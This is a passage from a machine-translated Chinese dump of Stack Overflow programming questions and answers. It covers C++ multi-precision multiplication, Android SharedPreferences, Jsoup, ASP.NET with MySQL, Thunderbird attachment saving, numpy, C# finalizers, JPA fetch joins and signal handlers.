请注意，当您将数字与`n`数字相乘时（底数无关紧要），您将得到一个`2n`数字，例如 99 * 99 = 9801（底数 10）、0xFF * 0xFF = 0xFE01（底数 16）。所以，如果`std::uintmax_t`是`std::uint64_t`您的系统上，您可以将您的号码存储为`std::uint32_t`. 将两位数相乘时，将它们转换为`std::uint64_t`并相乘。高 32 位将是进行下一个高位乘法运算的部分。（实际上，您也可以`std::uintmax_t`直接将变量相乘，但获取结果的高位部分通常有点棘手，并且需要内联汇编才能访问相应的`EDX\RDX`寄存器。）

有了这些知识，[学校乘法方法](http://en.wikipedia.org/wiki/Multiplication_algorithm)的实现应该很简单：只需遍历数字`a[i]`的所有数字`a`并将每个数字与数字相乘`b`（不要忘记传播进位）。将结果按`i`位数向上移动并将所有内容添加到最终结果中。

请注意，该算法在原始乘法的数量方面具有二次复杂度。如果您有（非常非常）大的数字，您还可以切换到更复杂的方法，例如 Karatsuba 甚至 FFT 和 Schönhage-Strassen。但在这种情况下，我真的建议使用库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:55:19.773

由于整数类型的隐式乘法是*二进制乘法*，您可以直接利用它来将数字视为基数 2 ⁸、 2 ^(16)或更高，而不是基数 2 ¹。

如果您假设 8 位数字（乘以`unsigned char`s），则下面的 24 位示例不如您问题中发布的 4 位乘法复杂。

```
 a1 a2 a3   (this is a 3 byte value)      
       x   b1 b2 b3   (this is another 3 byte value)      
           ======        
       xx xx xx xx    (this is a x b3)       
    xx xx xx xx       (this is a x b2, shifted 8 bits to the left)      
 xx xx xx xx          (this is a x b1, shifted 16 bits to the left)
 =================    
 xx xx xx xx xx xx    (this is the result). 
```

您可以将上面的“字节”替换为`short`或`long`，并相应调整班次。

只需确保将被乘数转换为足够大的类型以在乘法*之前*容纳进位即可。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:11:46.983

是的，您可以通过使用循环来完成此操作。假设类型`long`是32位，那么long*long的结果就是64位。

例如，如果你有一只`long A`蚂蚁 a `long B`，并且你想计算`a*b`

首先，您将结果定义为`long long result = 0;`。然后检查B的每一位，如果位为1，则添加`A << X`到结果中。其中X是位的索引。一个循环就可以做到这一点。

```
long long AA = A;// convernt A to AA to avoid overflow
for( int index=0;i<32;++index )
{
    if( B & 0x1 )
        result += AA;
    AA <<= 1;
    B >>= 1;
} 
```

我希望我没有犯错，这个想法可以帮助你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T12:47:15.983

您可以使用 Booth 的乘法算法。维基百科上有更多信息：[http ://en.wikipedia.org/wiki/Booth%27s_multiplication_algorithm](http://en.wikipedia.org/wiki/Booth%27s_multiplication_algorithm)

# android - 安卓 + 共享首选项

> ID：15879306
> 
> 赞同：1
> 
> 时间：2013-04-08T12:41:35.333
> 
> 标签：android, sharedpreferences, android-preferences

我是 android 新手，目前在使用 Preferences 时，我有以下疑问，API 说明如下： [http://developer.android.com/reference/android/content/SharedPreferences.html](http://developer.android.com/reference/android/content/SharedPreferences.html) 对首选项的修改必须通过 SharedPreferences .Editor 对象以确保首选项值保持一致状态

但在另一个[链接](http://developer.android.com/guide/topics/ui/settings.html)中，遵循以下代码样式：

* * *

```
public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
    if (key.equals(KEY_PREF_SYNC_CONN)) {           
        Preference connectionPref = findPreference(key);        
        connectionPref.setSummary(sharedPreferences.getString(key, ""));    
    }
} 
```

* * *

**那么在不使用编辑和提交的情况下编辑 Preference obj 是否可以？**

**编辑**

## 编辑代码

问题是我无法在摘要中设置默认值这是我用来解决此问题的完整代码....

```
public class Settings extends PreferenceActivity implements
                OnSharedPreferenceChangeListener {      
    //initializations      
    protected void onCreate(Bundle savedInstanceState) {
     bla bla
    PreferenceManager.setDefaultValues(getBaseContext(), R.xml.preferences, false);
    addPreferencesFromResource(R.xml.preferences);
    keys = getResources().getStringArray(R.array.prefKeys);
    p = PreferenceManager.getDefaultSharedPreferences(getBaseContext());
    //Gets the keys of the preferences
    for (int i = 0; i < keys.length; i++) {
    setSummary(p, keys[i]);
    }
    }   

   //Listener to detect changes             
   public void onSharedPreferenceChanged(SharedPreferences sharedPreferences,
                    String key) {
   Preference p = findPreference(key);
   if (p instanceof EditTextPreference) {
   p.setSummary(sharedPreferences.getString(key,(String) p.getSummary()));
   }
   else if (p instanceof ListPreference) {
   p.setSummary((String) ((ListPreference) p).getEntry());
   }
   }
   //First time initialization     
   private void setSummary(SharedPreferences sharedPreferences, String key) {
   Preference p = findPreference(key);
   if (p instanceof EditTextPreference) {
    //This was the mistake I did
   //p.setSummary(sharedPreferences.getString(key,(String) p.getSummary()));
   p.setSummary(((EditTextPreference) p).getText());
   }
  else if (p instanceof ListPreference) {
   //This was the mistake I did
  //p.setSummary((String) ((ListPreference) p).getEntry());         
  p.setSummary((String) ((ListPreference) p).getEntry());
  }
  }
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:03:57.047

你在谈论两个不同的话题。

首先，您有 SharedPreferences 对象，如指南所述，它必须且只能通过 SharedPreferences.Editor 对象进行编辑。请参阅以下位：

```
/**
 * This function writes the user's current score to persistent storage via {@link SharedPreferences}
 * @param key The Key to store the value with, this is the same value that must be used to retrieve the preference value at a later time. 
 * @param value The Actual Value to store for the supplied key. 
 */
private void saveScore (String key, int value) {
    //First, get the instance of the SharedPreference, this is a default file that has the Package name as it's own file name. 
    SharedPreferences mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
    //Get an instance of an editor by calling .edit()
    SharedPreferences.Editor mEditor= mPreferences.edit();

    //stage the changes
    mEditor.putBoolean("your-key", true || false);
    //Call commit to persit changes
    mEditor.commit();       
} 
```

当您谈论 时`onSharedPreferenceChanged`，这只是一个界面，可让您知道 SharedPreference 何时发生更改，它实际上并不编写/编辑首选项文件。

当与 a或 a一起使用时，该`onSharedPreferenceChanged`界面特别有用，可根据当前用户偏好的更改在需要时对用户界面进行更改。`PreferenceActivity``PreferenceFragment`

例如看这个：

```
public class Settings extends PreferenceActivity {

/**
 * The Key to be used to access the preference. This should be defined already on your preferences.xml file
 */
public static final String KEY_CURRENT_THEME = "pref_current_theme";
/**
 * The instance of the Theme Preference. 
 */
Preference mThemePreference;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    //Find the preference
    mThemePreference = findPreference(KEY_CURRENT_THEME);
    //Set the listener
    mThemePreference.setOnPreferenceChangeListener(mOnPreferencedChanged);
    //Call onPrerenceChanged to begin with in case the settings may have changed
    //The system will call this later each time the preference gets updated by the user via Settings
    mChangeListener.onPreferenceChange(
            mThemePreference,
            PreferenceManager.getDefaultSharedPreferences(
                    mThemePreference.getContext()).getString(mThemePreference.getKey(),
                            ""));   
}

private OnPreferenceChangeListener mOnPreferencedChanged = new OnPreferenceChangeListener() {

    @Override
    public boolean onPreferenceChange(Preference preference, Object newValue) {
        Resources mResources = preference.getContext().getResources();

        //You can check to see what change in two different ways.           
        //a) you can check the TypeOf the preference that changed. 
        if (preference instanceof CheckBoxPreference) {
            //If the preference that changes is a CheckBoxPreference, then do such and such changes. 
        } 
        //Or, you can check if it's a specific preference that changed

        if (preference == mThemePreference) {
            //If the preference is actually the Theme Preference itself, then do such and such changes. 
        }

        //Always return true so that the preference value change can be persisted, false otherwise. 
        return true;
    }
}; 
```

我希望这有帮助！:)

**编辑**

您的问题：*首选项文件存储在哪里，我如何访问它？*

**在哪里？**`PreferenceActivity`通过 a 、 a`PreferenceFragment`或通过调用创建/编辑的文件`PreferenceManager.getDefaultSharedPreferences(context)`存储在 /data/data/your.package.name/shared_prefs/your.package.name_preferences.xml

但是，该文件的存储位置与作为开发人员的您**无关，因为您****只能**通过调用`PreferenceManager.getDefaultSharedPreferences(context)`

例如，假设您有一个`CheckBoxPreference`定义是使用 Holo Dark 还是 Holo Light 作为您活动的主题，例如，看起来像这样：

![复选框首选项](https://i.stack.imgur.com/RZ5wX.jpg)

每次用户选中或取消选中首选项时，系统都会将该更改保存到上面为您讨论的默认首选项文件中，您无需手动保存此更改，因为它已经为您完成了。

如果您想做的不仅仅是持久化更改，您可以通过实现我上面提供的来拦截事件，您甚至可以通过返回持久化或不持久`OnPreferenceChangeListener`化来告诉系统是否应该持久化更改。`true``false`

**如何访问它？** 为了知道主题偏好的当前值是多少，比如说根据偏好值实际应用 UI 更改，您可以执行以下操作：

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
        //We update the preference dependent values **before** setting the content view
    updatePrefDependentValues();
    setContentView(R.layout.activity_empty_container);
    }

private void updatePrefDependentValues() {
    //get the instance of the SharedPreference Object. 
    mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
    //Update the boolean value based on the current preferences
    //The second parameter to getBoolean is a default value, we want false as default value. 
    mUseDarkTheme = mPreferences.getBoolean("whatever_key_you_set_for_this_preference", false);
    if (mUseDarkTheme) {
        //If we are using dark theme, set such theme. 
        setTheme(R.style.DarkTheme);
    }
    else if (!mUseDarkTheme) {
        //If we are **not** using dark theme, set light theme.
        setTheme(R.style.LightTheme);
    }
} 
```

如果您还有其他问题，请告诉我。

**编辑三：**

您不需要访问 Eclipse 上的文件，我想您想打开它来设置默认值，嗯，这就是preferences.xml 文件的用途。

想象一下，您将在设置上有一些东西，您有一个`CheckBoxPreference`主题，就像上面一样，您还有一个`CheckBoxPreference`用于启用和禁用后台同步，并且您有一个`ListPreference`用于存储在后台同步的频率。

上述所有设置都必须声明为默认值，在 a 的情况下`CheckBoxPreference`，默认值为布尔值，true 或 false，在 a`ListPreference`的情况下，默认值是您想要的任何值，具体取决于您提供给条目的值。

例如，这是一个非常简单的preference.xml 文件：

```
<?xml version="1.0" encoding="UTF-8"?>
<PreferenceScreen xmlns:android="http://schemas.android.com/apk/res/android">
<!-- Preference Categories are a good way to keep your Settings organized -->
<!-- android:key represents a String that is used to write and read from the preference file stored at /data/data/your.package.name -->
<PreferenceCategory
    android:title="@string/pref_title_general"
    android:key="pref_title_general"         
    >
    <!-- CheckBoxPreference are pretty simple, they only need a title, a key and a default value -->
    <!-- android:key is a MUST in each Preference as otherwise the system cannot persist changes to it.  -->
    <!-- android:key would be the same String you pass a "Key" 
    when calling mPreference.getBoolean(String key, Boolean default) from the Activity -->
    <CheckBoxPreference
        android:title="@string/pref_title_enable_dark_theme"
        android:key="pref_key_dark_theme"       
        android:defaultValue="false"                              
        />

</PreferenceCategory>

<PreferenceCategory
    android:title="@string/pref_title_sync_preferences"
    android:key="pref_title_navigation"         
    >

    <CheckBoxPreference
        android:title="@string/pref_title_enable_background_sync"
        android:key="pref_key_background_sync"       
        android:defaultValue="false"                              
        />

    <!-- ListPreference are a bit more complex, they require a Key to persist the changes
        android:entries represents the values displayed to the user when setting the preference
        android:entryValues represent the values that will be persisted, this array is the same size as the entries one.
        For instance, an Entry could be "Every 10 Minutes", and the entry value would be: "10" or "ten"
        This also requires a default value, which in this case MUST be a part of the entryValues array.   
        -->
    <ListPreference
        android:title="@string/pref_title_sync_frequency"
        android:key="pref_key_sync_frequency"
        android:entries="@array/pref_entries_sync_frequency"  
        android:entryValues="@array/pref_entries_values_sync_frequency" 
        android:defaultValue="@string/pref_default_sync_frequency"         
        />

</PreferenceCategory> 
```

同样，如果您使用 a `PreferenceActivity`or`PreferenceFragment`正确，则用户所做的更改将被保留，并且您实际上不需要做任何事情来在用户下次访问设置时进行更改。

如果您想了解有关设置和首选项的更多信息，请参阅以下内容：http: [//developer.android.com/guide/topics/ui/settings.html](http://developer.android.com/guide/topics/ui/settings.html)

**现在**，如果您要做的是持久化其他数据，这些数据可能不会显示在`PreferenceActivity`或上`PreferenceFragment`，比如用户名或电子邮件地址，那么您可以通过 saveScore 示例按照上述方式进行持久化。

这是有关 SharedPreferences 更多信息的链接：http: [//developer.android.com/training/basics/data-storage/shared-preferences.html](http://developer.android.com/training/basics/data-storage/shared-preferences.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:51:40.050

`Preference`并且`SharedPreferences`不一样。但是，它们经常一起使用。

[`Preference`](http://developer.android.com/reference/android/preference/Preference.html)是用于显示和编辑用户首选项的 UI 类。

[`SharedPreferences`](http://developer.android.com/reference/android/content/SharedPreferences.html)是用于持久化应用程序设置的非 UI 类。要更改这些设置，您需要使用 获取一个`SharedPreferences.Editor`实例，`edit()`然后使用 存储更改`commit()`。

通常，`Preference`值存储在`SharedPreferences`.

# java - 为什么给定代码抛出异常（Jsoup）

> ID：15879307
> 
> 赞同：1
> 
> 时间：2013-04-08T12:41:35.803
> 
> 标签：java, javascript, html, dom, jsoup

正如许多论坛上所说的那样，元素是 DOM 中节点的特例。

但我有一个违反这条规则的例外。

它在语句中抛出异常，`elem.remove()`.

这里，ele 是一个元素。`remove()`是 Jsoup API 中的一个函数，用于从 DOM 中删除节点及其后代。

**例外 ：-**

```
[WARNING] 
java.lang.reflect.InvocationTargetException
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:297)
    at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.IllegalArgumentException: Object must not be null
    at org.jsoup.helper.Validate.notNull(Validate.java:16)
    at org.jsoup.nodes.Node.remove(Node.java:266)
    at XXX.YYY.ZZZ.Template_Matching.Template_Matching.removeProductLister(Template_Matching.java:80)
    at XXX.YYY.ZZZ.Template_Matching.Template_Matching.main(Template_Matching.java:376)
    ... 6 more
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE 
```

**代码**：-

```
public static void function(Document doc1, Document doc2, String tag) {

        //Checking for ULs
        Elements uls_1 = doc1.getElementsByTag(tag);
        Elements uls_2 = doc2.getElementsByTag(tag);

        for (Element elem1 : uls_1) {

            // Check if elem1 exists in DOM, If No, then continue

            for (Element elem2 : uls_2) {

                // Check if elem2 exists in DOM, If No, then continue

                // If id matches, remove them
                if ((!"".equals(elem1.id())) && (elem1.id().equals(elem2.id()))) {
                    elem1.remove();
                    elem2.remove();
                    break;
                }
            }
        }
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-05-31T12:45:05.777

当尝试删除其父元素已被删除的元素时，会发生错误。这可能指向 Jsoup 中的错误。不删除父母也会删除孩子吗？

一种解决方法是首先检查父级是否存在：

```
if (element != null && element.parent() != null) { // fixes java.lang.IllegalArgumentException in org.jsoup.helper.Validate.notNull
    element.remove();
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T12:46:14.420

引起：java.lang.IllegalArgumentException：对象不能为空

您需要检查您没有访问空对象的属性...

# c# - 绑定子 Gridview

> ID：15879313
> 
> 赞同：0
> 
> 时间：2013-04-08T12:41:42.513
> 
> 标签：c#, asp.net, gridview

我有一个嵌套的 gridview 并且它是可编辑的。尽管它使用访问作为其数据源用于测试目的，但我想将它与 mysql 数据源一起部署。我意识到有些不对劲。单击搜索时，我的 Gridview 必须显示。这是我原来的访问数据源代码：

```
//This procedure prepares the query to bind the child GridView
private AccessDataSource ChildDataSource(string strCustometId, string strSort)
{
    string strQRY = "";
    AccessDataSource dsTemp = new AccessDataSource();
    dsTemp.DataFile = "App_Data/BV.mdb";
    strQRY = "Query statement";

    dsTemp.SelectCommand = strQRY;
    return dsTemp;
} 
```

我更改为容纳 MySql 用户。

```
private SqlDataSource ChildDataSource(string strCustometId, string strSort)
{
    string strQRY = "";
    SqlDataSource dsTemp = new SqlDataSource();
    dsTemp.ID = "dsTemp";

   string sCon= WebConfigurationManager.ConnectionStrings["bv"].ConnectionString;
   dsTemp.ConnectionString = sCon;
    strQRY = "Query stament here";
dsTemp.SelectCommand = strQRY;
    return dsTemp;
} 
```

这是我来自 web.config 的连接字符串。

```
 <connectionStrings>
  <add name="bv" connectionString="server=localhost;database=cms;Connect Timeout=30;Persist Security Info=False;User id = root;password=xxxxx" providerName="MySql.Data.MySqlClient"/> 
```

第二个代码给出错误并显示用户“root”登录失败。我的连接字符串和数据源代码有问题。我没有经验，请在这方面需要帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:52:03.593

您需要确保 SQL Server 使用您在连接字符串中指定的密码登录用户“root”，并且用户“root”具有访问“cms”数据库中对象的必要权限。

# javascript - 使用 Thunderbird 源保存电子邮件附件

> ID：15879314
> 
> 赞同：0
> 
> 时间：2013-04-08T12:41:52.490
> 
> 标签：javascript, thunderbird, thunderbird-addon

我想使用雷鸟源代码保存电子邮件附件。我在您的论坛中获得了以下代码..但它不起作用

```
 alert("Messages selected: " + gFolderDisplay.selectedCount);
      let enumerator = gFolderDisplay.selectedMessages;
        for each (let msgHdr in fixIterator(enumerator, Ci.nsIMsgDBHdr)) {
          var messageID = msgHdr.messageId;
           alert("MessageID: " + messageID);
           var subject = msgHdr.mime2DecodedSubject;
          alert("Subject: " + subject);
            MsgHdrToMimeMessage(msgHdr, null, function (aMsgHdr, aMimeMsg) {
              try {
        alert("Size of the message: " + aMimeMsg.size);
            alert("Structure of the message:\n" + aMimeMsg.prettyString(true, undefined, true));
             let attachments = aMimeMsg.allUserAttachments || aMimeMsg.allAttachments;
             alert("Number of attachments: " + attachments.length);
                   for (let [index, att] in Iterator(attachments))
        {
            alert ("URL: " + att.url  + " Name: " + att.name);
            let ioService = Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);  
            let neckoURL = null;  
            neckoURL = ioService.newURI(att.url, null, null);  
            neckoURL.QueryInterface(Ci.nsIMsgMessageUrl);  
            let uri = neckoURL.uri;  
            let attInfo = new AttachmentInfo(att.contentType, att.url, att.name, uri, att.isExternal);
            attInfo.save();
        }
    } catch (err) {
        alert(err);
    }
}, true, { examineEncryptedParts: true, });
} 
```

使用上面的代码，我可以浏览选定的消息。但不能保存附件。它显示附件的数量。而且我想为选定的邮件设置我自己的标签。我怎样才能做到这一点？请帮帮我...在此先感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-23T08:10:28.487

工作代码

```
 var enumerator = gFolderDisplay.selectedMessages;
        for each (var msgHdr in fixIterator(enumerator, Components.interfaces.nsIMsgDBHdr)) {
        msgHdr.setStringProperty("docuHive","dhivelabel");

            MsgHdrToMimeMessage(msgHdr, null, function (aMsgHdr, aMimeMsg) {
              try {
             var attachments = aMimeMsg.allUserAttachments || aMimeMsg.allAttachments;
                   for (var [index, att] in Iterator(attachments))
        {
            var ioService = Components.classes["@mozilla.org/network/io-service;1"].getService(Components.interfaces.nsIIOService);  
            var neckoURL = null;  
            neckoURL = ioService.newURI(att.url, null, null);  
            neckoURL.QueryInterface(Components.interfaces.nsIMsgMessageUrl);  
            var uri = neckoURL.uri;  
            var attInfo = new AttachmentInfo(att.contentType, att.url, att.name, uri, att.isExternal); 
            // getting the chrome directory
            var file = Components.classes["@mozilla.org/file/directory_service;1"].
           getService(Components.interfaces.nsIProperties).
           get("AChrom", Components.interfaces.nsIFile);

           var msguri = msgHdr.folder.getUriForMsg(msgHdr);

    messenger = Components.classes["@mozilla.org/messenger;1"]
                       .createInstance(Components.interfaces.nsIMessenger);
                       alert(messenger);
        messenger.saveAttachmentToFolder(att.contentType,att.url,"attachmentname.extension",msguri,file);

        }
    } catch (err) {
        alert(err);
    }
}, true, { examineEncryptedParts: true, });
} 
```

# python - numpy中的ndarray和array有什么区别？

> ID：15879315
> 
> 赞同：333
> 
> 时间：2013-04-08T12:41:55.370
> 
> 标签：python, arrays, numpy, multidimensional-array, numpy-ndarray

`ndarray`Numpy和Numpy有什么区别`array`？我在哪里可以找到 numpy 源代码中的实现？

* * *

## 回答 #1

> 赞同：291
> 
> 时间：2013-04-08T12:51:01.930

`numpy.array`只是一个方便的功能来创建一个`ndarray`; 它本身不是一个类。

您也可以使用 创建数组`numpy.ndarray`，但这不是推荐的方式。从文档字符串`numpy.ndarray`：

> 应使用`array`,`zeros`或... 构造数组。此处给出的参数是指用于实例化数组`empty`的低级方法 ( )。`ndarray(...)`

实现的大部分内容都在 C 代码中，[在 multiarray 中](https://github.com/numpy/numpy/tree/master/numpy/core/src/multiarray)，但您可以在此处开始查看 ndarray 接口：

[https://github.com/numpy/numpy/blob/master/numpy/core/numeric.py](https://github.com/numpy/numpy/blob/master/numpy/core/numeric.py)

* * *

## 回答 #2

> 赞同：64
> 
> 时间：2013-04-08T12:46:32.857

`numpy.array`是一个返回 a 的函数`numpy.ndarray`。没有对象类型 numpy.array。

* * *

## 回答 #3

> 赞同：46
> 
> 时间：2017-12-21T03:25:25.557

只需几行示例代码即可显示 numpy.array 和 numpy.ndarray 之间的区别

**热身步骤：构建列表**

```
a = [1,2,3] 
```

检查类型

```
print(type(a)) 
```

你会得到

```
<class 'list'> 
```

**使用 np.array 构造一个数组（从一个列表）**

```
a = np.array(a) 
```

或者，你可以跳过预热步骤，直接有

```
a = np.array([1,2,3]) 
```

检查类型

```
print(type(a)) 
```

你会得到

```
<class 'numpy.ndarray'> 
```

它告诉你**numpy 数组的类型是 numpy.ndarray**

您还可以通过以下方式检查类型

```
isinstance(a, (np.ndarray)) 
```

你会得到

```
True 
```

以下两行中的任何一行都会给您一条错误消息

```
np.ndarray(a)                # should be np.array(a)
isinstance(a, (np.array))    # should be isinstance(a, (np.ndarray)) 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2018-09-23T16:02:16.313

`numpy.ndarray()`是一个类，`numpy.array()`而是一个方法/函数来创建`ndarray`。

在 numpy 文档中，如果你想从`ndarray`类中创建一个数组，你可以用 2 种方法来完成它：

1- using `array()`, `zeros()`or`empty()`方法： *应使用数组、零或空来构造数组（请参阅下面的另请参阅部分）。`ndarray(…)`此处给出的参数是指用于实例化数组的低级方法 ( )。*

2-`ndarray`直接从类： *有两种使用创建数组的模式`__new__`：如果缓冲区为无，则仅使用形状、数据类型和顺序。如果 buffer 是一个暴露缓冲区接口的对象，那么所有的关键字都会被解释。*

下面的示例给出了一个随机数组，因为我们没有分配缓冲区值：

> ```
> np.ndarray(shape=(2,2), dtype=float, order='F', buffer=None)
> 
> array([[ -1.13698227e+002,   4.25087011e-303],
>        [  2.88528414e-306,   3.27025015e-309]])         #random 
> ```

另一个示例是将数组对象分配给缓冲区示例：

> ```
> >>> np.ndarray((2,), buffer=np.array([1,2,3]),
> ...            offset=np.int_().itemsize,
> ...            dtype=int) # offset = 1*itemsize, i.e. skip first element
> array([2, 3]) 
> ```

从上面的示例中，我们注意到我们不能将列表分配给“缓冲区”，我们必须使用 numpy.array() 来返回缓冲区的 ndarray 对象

结论：`numpy.array()`如果你想制作一个`numpy.ndarray()`对象，请使用“

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2018-08-30T20:09:12.410

我认为`np.array()`尽管您提到订单，但您只能像创建 C 一样，当您检查使用`np.isfortran()`它时说假。但是`np.ndarrray()`当您指定它根据提供的订单创建的订单时。

# java - 是否有任何用于独立应用程序（SWT/Swing 等）的模板引擎，就像 Velocity 等

> ID：15879320
> 
> 赞同：1
> 
> 时间：2013-04-08T12:42:25.883
> 
> 标签：java, swing, swt, eclipse-plugin

正如标题所说，是否有任何 UI 模板引擎可用于独立应用程序（如 SWT、Swing），就像我们为 Web 应用程序提供 apache velocity 或 freemaker 一样？

目前我们正在开发一个基于 Eclipse 的产品，我觉得这个 UI 将为一些客户定制/品牌化，所以对于每个客户我们都需要接触 UI 代码。我做了一个研究，但没有找到任何有用的结果。

我们已经开发了一个引擎的小型原型，它可以进行基本的 UI 控件模板，但在认真研究该项目之前，我想在这里咨询专家，这样我们就不会重新发明轮子，如果已经可用的话。我的想法是我应该能够更改 UI（至少是标题栏文本等基本品牌），这样我们就不需要重建整个应用程序来更改磁贴栏。

所以我认为我的问题很清楚，如果需要，我可以提供更多细节。注意：我们是一家纯 Java EE 商店，这是我们在独立方面做的第一个项目，如果我问任何明显的事情，对不起。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:18:54.887

[使用基于 JVM 的脚本语言（如Groovy](http://groovy.codehaus.org/GUI+Programming+with+Groovy)、JRuby ）编写 UI 代码怎么样？

# c# - 终结器如何工作？

> ID：15879335
> 
> 赞同：0
> 
> 时间：2013-04-08T12:42:48.583
> 
> 标签：c#, .net

我试图弄清楚 c# 中的 GC/终结器是如何工作的，所以我编写了以下程序。但是在 ReadKey 之后，终结器被调用了 36193 次。我认为它应该在程序完成并且 AppDomain 正在卸载时只调用一次。我在这里缺少什么，这是如何工作的？

```
 private class GCAnalyzer
    {
        private static int count = 0;
        ~GCAnalyzer()
        {
            if (!AppDomain.CurrentDomain.IsFinalizingForUnload())
            {
                count++;
                GC.ReRegisterForFinalize(this);
                Console.WriteLine("GC " + count);
            }
        }
    }

    static void Main(string[] a)
    {
        new GCAnalyzer();

        Console.ReadKey();
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:48:18.537

如果我没看错，那么当对象“未链接”时您正在调用 ~GCAnalyzer()，并且在该代码期间，您说它还没有准备好通过 GC.ReRegisterForFinalize(this) “取消链接”，这意味着下次检查它仍然没有使用，它的结束代码正在运行......重新注册自己......等等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T08:27:51.827

关键是添加 !Environment.HasShutdownStarted 检查。然后在每个集合上调用终结器并将其放回终结列表中。所以在这个程序中，终结器被调用了 3 次。每个 GC.Collect 两次，然后将其注册回最终列表中，第三次当应用程序关闭然后它没有重新注册，因此它可以优雅地关闭 dowb。

```
 private class GCAnalyzer
    {
        private static int count = 0;
        ~GCAnalyzer()
        {
            Console.WriteLine("GC " + count);
            if (!AppDomain.CurrentDomain.IsFinalizingForUnload() &&!Environment.HasShutdownStarted)
            {
                count++;
                GC.ReRegisterForFinalize(this);                    
            }
        }
    }

    static void Main(string[] a)
    {
        new GCAnalyzer();

        Console.ReadKey();

        GC.Collect();

        Console.ReadKey();

        GC.Collect();
    } 
```

# java - 强制 JPA 查询急切地返回所有集合/字段

> ID：15879338
> 
> 赞同：8
> 
> 时间：2013-04-08T12:42:54.107
> 
> 标签：java, web-services, jpa, eclipselink

我很少有服务器使用 JPA 从数据库中查询对象，然后通过 Web 服务将对象发送到客户端的场景。
由于客户端在这种情况下期望完整的图表，我想用急切加载覆盖延迟加载的集合，并可能请求批量加载（为了性能）。JPA（或EclipseLink）中是否有一种方法可以以通用方式覆盖查询（无需重写查询）并请求完整图？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-08T12:44:49.703

10.1.3\. 获取连接

JPQL 查询可以指定一个或多个连接提取声明，允许查询指定返回实例中的哪些字段将被预提取。

```
SELECT x FROM Magazine x join fetch x.articles WHERE x.title = 'JDJ' 
```

上面的查询返回 Magazine 实例并保证在返回的实例中已经获取了文章字段。

可以在单独的连接提取声明中指定多个字段：

```
SELECT x FROM Magazine x join fetch x.articles join fetch x.authors WHERE x.title = 'JDJ' 
```

来源：[http ://docs.oracle.com/cd/E13189_01/kodo/docs40/full/html/ejb3_overview_query.html#ejb3_overview_join_fetch](http://docs.oracle.com/cd/E13189_01/kodo/docs40/full/html/ejb3_overview_query.html#ejb3_overview_join_fetch)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:05:16.490

如果您使用的是 eclipselink，则可以使用内置的查询提示。这样你就不必重写你的 jpql，但是你可以在 java.util 中定义 fetch 类型。

[http://wiki.eclipse.org/EclipseLink/UserGuide/JPA/Basic_JPA_Development/Query_Hints#Join_Fetch](http://wiki.eclipse.org/EclipseLink/UserGuide/JPA/Basic_JPA_Development/Query_Hints#Join_Fetch)

# signals - 调用了哪个线程的信号处理程序（例如 signal(SIGINT, crtl_c);）？

> ID：15879342
> 
> 赞同：1
> 
> 时间：2013-04-08T12:42:55.753
> 
> 标签：signals

信号会中断主线程还是从某个 OS 线程调用？换句话说，在实现信号处理程序时我是否必须担心线程安全？例如，如果`on_sigint`在单独的线程上调用以下代码，则会随机失败。他们是吗？会吗？

```
#include <csignal>
#include <windows.h>

HANDLE hSigint;

void on_sigint(int sig)
{
    if (hSigint != NULL) SetEvent(hSigint);
    else hSigint = INVALID_HANDLE_VALUE;
}

int wmain(int argc, wchar_t** argv)
{
    hSigint = NULL;
    signal(SIGINT, on_sigint);
    BuildSomething();
    if (hSigint == NULL)
    {
        hSigint = CreateEvent(NULL, TRUE, FALSE, NULL);
        SetSomethingInMotion();
        WaitForSingleObject(hSigint, INFINITE);
    }
    TearSomethingDown();
    return 0;
} 
```

尽管有 Windows 示例，Linux 的答案也很受欢迎。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T14:16:45.040

根据文档，`SIGINT`Windows 不支持。有关更多信息，请参见下文。

首先，Windows 只支持 C 规范要求的最小信号。

1.  SIGABRT 异常终止
2.  SIGFPE 浮点错误
3.  SIGILL 非法指令
4.  SIGINT CTRL+C 信号
5.  SIGSEGV 非法存储访问
6.  SIGTERM 终止请求

仅支持那些信号，并且信号和 IO 之间的复杂交互不会发生 - 例如`SIGINT`，不会导致正在进行的 IO 中止，并且`SIGALRM`不存在。

*   请参阅[http://msdn.microsoft.com/en-us/library/xdkz3x12(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/xdkz3x12(v=vs.71).aspx)

